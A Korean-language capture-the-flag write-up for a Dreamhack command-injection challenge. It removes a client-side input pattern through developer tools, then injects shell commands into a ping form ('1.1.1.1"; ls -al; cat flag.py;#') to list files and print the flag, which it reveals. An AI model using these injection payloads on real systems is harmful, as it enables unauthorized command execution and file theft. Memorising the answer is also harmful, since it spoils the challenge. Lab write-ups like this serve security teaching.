## command-injection-1
> 문제 URL: https://dreamhack.io/wargame/challenges/44  
> 특정 Host에 ping 패킷을 보내는 서비스입니다. `Command Injection`을 통해 플래그를 획득하세요. 플래그는 `flag.py`에 있습니다.

### Solve
1. 먼저 `1.1.1.1`로 테스트
```bash
PING 1.1.1.1 (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: seq=0 ttl=42 time=1.390 ms
64 bytes from 1.1.1.1: seq=1 ttl=42 time=1.561 ms
64 bytes from 1.1.1.1: seq=2 ttl=42 time=1.232 ms
```

2. 개발자모드에서 입력칸에 아래와 같은 내용 확인
```html
<input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host" pattern="[A-Za-z0-9.]{5,20}" required="">
```

3. 다음과 같이 수정
```html
<input type="text" class="form-control" id="Host" placeholder="8.8.8.8" name="host">
```

4. 입력칸에 명령어 추가하여 입력
```bash
1.1.1.1"; ls -al;#
```
```bash
PING 1.1.1.1 (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: seq=0 ttl=42 time=1.390 ms
64 bytes from 1.1.1.1: seq=1 ttl=42 time=1.561 ms
64 bytes from 1.1.1.1: seq=2 ttl=42 time=1.232 ms

--- 1.1.1.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 1.232/1.394/1.561 ms
total 32
drwxr-xr-x    1 dreamhac dreamhac      4096 Feb 22 02:57 .
dr-xr-xr-x    1 root     root          4096 Feb 22 02:57 ..
drwxr-xr-x    2 dreamhac dreamhac      4096 Feb 22 02:57 __pycache__
-rwxr-xr-x    1 root     root           955 May  7  2024 app.py
-rw-r--r--    1 root     root            36 May  7  2024 flag.py
-rwxr-xr-x    1 root     root             5 May  7  2024 requirements.txt
drwxr-xr-x    5 root     root          4096 May  7  2024 static
drwxr-xr-x    2 root     root          4096 May  7  2024 templates
```

5. flag.py 내용을 확인하여 플래그 획득
```bash
1.1.1.1"; ls -al; cat flag.py;#
```
```bash
PING 1.1.1.1 (1.1.1.1): 56 data bytes
64 bytes from 1.1.1.1: seq=0 ttl=42 time=1.306 ms
64 bytes from 1.1.1.1: seq=1 ttl=42 time=1.639 ms
64 bytes from 1.1.1.1: seq=2 ttl=42 time=1.314 ms

--- 1.1.1.1 ping statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max = 1.306/1.419/1.639 ms
total 32
drwxr-xr-x    1 dreamhac dreamhac      4096 Feb 22 02:57 .
dr-xr-xr-x    1 root     root          4096 Feb 22 02:57 ..
drwxr-xr-x    2 dreamhac dreamhac      4096 Feb 22 02:57 __pycache__
-rwxr-xr-x    1 root     root           955 May  7  2024 app.py
-rw-r--r--    1 root     root            36 May  7  2024 flag.py
-rwxr-xr-x    1 root     root             5 May  7  2024 requirements.txt
drwxr-xr-x    5 root     root          4096 May  7  2024 static
drwxr-xr-x    2 root     root          4096 May  7  2024 templates
FLAG = 'DH{pingpingppppppppping!!}'
```